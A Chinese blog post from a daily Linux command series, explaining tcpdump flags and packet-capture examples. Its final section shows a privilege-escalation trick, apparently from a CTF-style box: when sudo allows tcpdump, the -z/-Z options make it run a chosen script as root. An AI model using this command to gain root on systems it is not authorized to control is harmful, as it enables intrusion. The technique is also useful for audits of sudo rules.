---
title: '每天一个Linux命令-tcpdump'
date: 2020-02-06
category: '编程'
tags:
  - 'tcpdump'
  - '提权'
lang: 'zh'
draft: false
---
## 基本用法

-   \-i 指定网卡接口
-   \-c 指定数量
-   \-w 保存的文件名
-   \-z 指定脚本
-   \-Z 指定用户

## 使用实例

指定主机，截获所有210.27.48.1 的主机收到的和发出的所有的数据包

```
tcpdump host 210.27.48.1
```

截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信

```
tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \)
```

截获主机hostname发送的所有数据

```
tcpdump -i eth0 src host hostname
```

监视所有送到主机的数据包

```
tcpdump -i eth0 dst host hostname
```

如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令

```
tcpdump tcp port 23 and host 210.27.48.1
```

对本机的udp 123 端口进行监视 123 为ntp的服务端口

```
tcpdump udp port 123
```

## 使用tcpdump抓包，再用wireshark查看

```
tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap
```

抓取http包

```
tcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854
```

## tcpdump提权

遇到这种情况

```bash
webdeveloper@webdeveloper:~$ sudo -l
[sudo] password for webdeveloper:
Matching Defaults entries for webdeveloper on webdeveloper:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

可以用root身份执行tcpdump命令，其中 `/tmp/exploit` 是想要以root身份执行的脚本

```
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
```

> \-z 指定脚本，-Z 指定用户身份
